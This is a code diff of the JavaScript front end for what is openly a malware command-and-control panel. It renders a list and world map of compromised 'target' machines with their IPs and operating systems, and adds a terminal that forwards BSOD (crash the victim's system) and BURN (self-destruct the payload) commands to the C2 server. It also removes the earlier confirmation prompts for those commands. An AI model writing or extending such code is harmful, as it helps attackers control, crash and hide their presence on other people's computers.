@@ -131,6 +131,134 @@ async function fetchData() {
 }
 
 // ==========================================
+// RENDER & SELECTION LOGIC (TARGETS & MAP)
+// ==========================================
+function renderNodesList() {
+    const container = document.getElementById('nodes-list');
+    if(!container) return;
+    container.innerHTML = '';
+    
+    if (allNodes.length === 0) {
+        container.innerHTML = `<p class="text-gray-500 p-4 text-xs font-mono">Authenticate with a Target ID to begin.</p>`;
+        return;
+    }
+
+    allNodes.forEach(node => {
+        let dotColor = node.status === 'green' ? 'bg-green-500' : (node.status === 'red' ? 'bg-red-500' : 'bg-yellow-500');
+        let activeBorder = 'border border-neon bg-neon/5'; 
+        let activeLine = '<div class="absolute left-0 top-0 bottom-0 w-1 bg-neon"></div>';
+        let pulse = node.status === 'green' ? 'animate-pulse' : '';
+
+        let osLower = (node.os || "").toLowerCase();
+        let osIconClass = 'fa-brands fa-windows text-cyberBlue'; 
+        
+        if (osLower.includes('win')) {
+            osIconClass = 'fa-brands fa-windows text-cyberBlue';
+        } else if (osLower.includes('mac') || osLower.includes('darwin')) {
+            osIconClass = 'fa-brands fa-apple text-gray-300';
+        } else if (osLower.includes('linux') || osLower.includes('ubuntu')) {
+            osIconClass = 'fa-brands fa-linux text-yellow-400';
+        } else if (osLower.length > 0) {
+            osIconClass = 'fa-solid fa-desktop text-gray-400';
+        }
+
+        container.innerHTML += `
+            <div class="p-3 ${activeBorder} rounded-lg relative overflow-hidden group transition-all">
+                ${activeLine}
+                <div class="flex justify-between items-start mb-2 pl-2">
+                    <div class="flex items-center gap-2">
+                        <i class="${osIconClass} text-lg"></i>
+                        <div>
+                            <p class="text-sm font-bold text-white truncate max-w-[120px]">${node.id}</p>
+                            <p class="text-[10px] text-gray-400 font-mono">${node.ip}</p>
+                        </div>
+                    </div>
+                    <span class="w-2.5 h-2.5 rounded-full ${dotColor} ${pulse} shadow-[0_0_8px_currentColor]"></span>
+                </div>
+                <p class="text-[10px] text-gray-500 mt-1 pl-2 truncate" title="${node.os}">${node.os}</p>
+            </div>`;
+    });
+}
+
+function renderMap() {
+    const mapDots = document.getElementById('map-dots');
+    if(!mapDots) return;
+    mapDots.innerHTML = '';
+    
+    allNodes.forEach(node => {
+        const x = (node.lng + 180) / 3.6;
+        const y = (90 - node.lat) / 1.8;
+        
+        let dotColor = node.status === 'green' ? 'text-green-500' : (node.status === 'red' ? 'text-red-500' : 'text-yellow-500');
+        mapDots.innerHTML += `
+            <div class="map-dot ${dotColor}" style="left: ${x}%; top: ${y}%;">
+                <div class="map-tooltip text-[10px] text-left">
+                    <div class="font-bold text-white border-b border-gray-700 pb-1 mb-1">${node.id}</div>
+                    <div class="text-gray-400">IP: <span class="text-cyberBlue">${node.ip}</span></div>
+                    <div class="text-gray-400">OS: <span class="text-white">${node.os}</span></div>
+                    <div class="text-gray-400">STAT: <span class="${dotColor}">${node.status.toUpperCase()}</span></div>
+                </div>
+            </div>`;
+    });
+}
+
+window.selectNode = function(nodeId) {
+    termLog(`Session established. Authenticated as: ${nodeId}`);
+    document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via reverse TCP proxy`;
+    document.getElementById('fs-active-node').innerText = nodeId;
+};
+
+// ==========================================
+// TERMINAL LOGIC
+// ==========================================
+window.termLog = function(msg) {
+    const term = document.getElementById('terminal-output');
+    if(!term) return;
+    
+    term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', '');
+    const line = document.createElement('div'); 
+    line.className = "text-gray-300 mt-1"; 
+    line.innerText = `[*] ${msg}`;
+    term.appendChild(line);
+    
+    const prompt = document.createElement('div'); 
+    prompt.className = "mt-2 text-green-400"; 
+    prompt.innerHTML = `C:\\Users\\System> <span class="cursor-blink"></span>`;
+    term.appendChild(prompt);
+    
+    term.scrollTop = term.scrollHeight;
+};
+
+window.executeTermCommand = function(inputEl) {
+    const val = inputEl.value.trim();
+    if(!val) return;
+    
+    const term = document.getElementById('terminal-output');
+    term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', val);
+    
+    setTimeout(() => {
+        if(val.toLowerCase() === 'clear') { 
+            term.innerHTML = `<div class="text-green-400">C:\\Users\\System> <span class="cursor-blink"></span></div>`; 
+            inputEl.value = ''; 
+            return; 
+        }
+        
+        if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
+            termLog(`Forwarding command to C2 server...`);
+            if (val.toUpperCase() === 'BURN') {
+                sendCommandToNode(activeNodeId, "SELF_DESTRUCT");
+            } else {
+                sendCommandToNode(activeNodeId, "BSOD");
+            }
+        } else {
+            termLog(`'${val}' queued. (Note: standard terminal emulation in development)`);
+        }
+    }, 200);
+    
+    inputEl.value = '';
+};
+
+// ==========================================
 // C2 COMMAND FUNCTIONS
 // ==========================================
 async function sendCommandToNode(deviceId, command) {
@@ -157,32 +285,6 @@ async function sendCommandToNode(deviceId, command) {
         termLog(`[ERROR] Failed to send command: ${error.message}`);
     }
 }
-
-window.triggerScorchedEarth = function() {
-    if (!activeNodeId) {
-        return showToast("No active node.", "error");
-    }
-    
-    const confirmation = prompt(`WARNING: SCORCHED EARTH PROTOCOL.\nThis will permanently remove the payload from ${activeNodeId}.\n\nType 'BURN' to confirm.`);
-    
-    if (confirmation === "BURN") { 
-        sendCommandToNode(activeNodeId, "SELF_DESTRUCT"); 
-    } else { 
-        showToast("Self-destruct aborted.", "error"); 
-    }
-};
-
-window.triggerBSOD = function() {
-    if (!activeNodeId) {
-        return showToast("No active node.", "error");
-    }
-    
-    if (confirm(`This will force a Blue Screen of Death (BSOD) on ${activeNodeId}. The target system will immediately crash.\n\nAre you sure?`)) {
-        sendCommandToNode(activeNodeId, "BSOD");
-    } else { 
-        showToast("BSOD command aborted.", "error"); 
-    }
-};
 
 // ==========================================
 // LIVE VIEW STREAMING (HIGH SPEED)
